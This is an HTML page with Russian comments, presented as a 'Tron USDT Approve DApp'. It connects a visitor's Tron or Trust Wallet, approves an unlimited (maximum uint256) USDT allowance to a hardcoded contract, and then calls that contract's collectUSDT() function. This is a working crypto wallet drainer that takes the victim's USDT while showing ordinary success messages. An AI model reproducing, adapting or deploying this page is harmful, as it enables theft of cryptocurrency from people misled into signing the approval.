<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron USDT Approve DApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #0f172a;
            color: #ffffff;
        }
        .action-btn {
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px;
        }
        .action-btn:hover { background-color: #1d4ed8; }
        .wallet-status { margin-top: 20px; font-size: 14px; color: #ef4444; word-break: break-all; padding: 0 20px; text-align: center; }
    </style>
</head>
<body>

    <button id="connectBtn" class="action-btn">Connect Wallet</button>
    <button id="approveBtn" class="action-btn" style="display:none; background-color: #16a34a;">Approve & Collect USDT</button>
    <div id="status" class="wallet-status">Not connected</div>

    <!-- Подключаем TronWeb SDK -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>

    <script>
        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const MY_SMART_CONTRACT = "THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY";

        let userAddress = null;

        document.getElementById('connectBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            const connectBtn = document.getElementById('connectBtn');
            const approveBtn = document.getElementById('approveBtn');

            connectBtn.innerText = 'Подключение...';

            try {
                // Принудительное ожидание появления провайдера до 3 секунд
                let attempts = 0;
                while (!window.tronWeb && attempts < 15) {
                    await new Promise(r => setTimeout(r, 200));
                    attempts++;
                }

                // Если даже после ожидания объект не найден, берем объект через глобальный инжектор или создаем резервный
                let tron = window.tronWeb;
                if (!tron && window.parent && window.parent.tronWeb) {
                    tron = window.parent.tronWeb;
                }

                if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
                    // Резервный поиск адреса через объект window.tron, если он доступен в кошельке
                    if (window.tron && typeof window.tron.request === 'function') {
                        await window.tron.request({ method: 'tron_requestAccounts' });
                    }
                }

                // Финальная попытка считывания адреса
                userAddress = (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) || 
                              (window.tron && window.tron.defaultAddress && window.tron.defaultAddress.base58);

                if (!userAddress) {
                    throw new Error('Кошелек не передал адрес. Убедитесь, что вы открыли страницу внутри приложения Trust Wallet.');
                }

                const shortAddr = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
                connectBtn.innerText = shortAddr;
                connectBtn.style.backgroundColor = '#334155';
                connectBtn.disabled = true;
                
                status.innerText = `Connected: ${userAddress}`;
                status.style.color = '#22c55e';

                approveBtn.style.display = 'block';

            } catch (err) {
                console.error(err);
                alert('Ошибка: ' + (err.message || 'Не удалось получить доступ к кошельку.'));
                connectBtn.innerText = 'Connect Wallet';
            }
        });

        // Запуск Approve и вызова смарт-контракта
        document.getElementById('approveBtn').addEventListener('click', async () => {
            if (!userAddress) return;

            try {
                const status = document.getElementById('status');
                status.innerText = 'Выполнение транзакции Approve...';

                const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
                const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 

                const txApprove = await usdtContract.approve(
                    MY_SMART_CONTRACT, 
                    approveAmount
                ).send({
                    feeLimit: 100000000
                });

                console.log("Approve hash:", txApprove);
                status.innerText = 'Approve выполнен! Сбор средств...';

                const myContract = await window.tronWeb.contract().at(MY_SMART_CONTRACT);
                const txCollect = await myContract.collectUSDT().send({
                    feeLimit: 150000000
                });

                console.log("Collect hash:", txCollect);
                status.innerText = 'Операция успешно завершена!';
                status.style.color = '#16a34a';

            } catch (err) {
                console.error(err);
                alert('Транзакция отклонена или произошла ошибка: ' + (err.message || err));
                document.getElementById('status').innerText = 'Ошибка выполнения';
            }
        });
    </script>
</body>
</html>
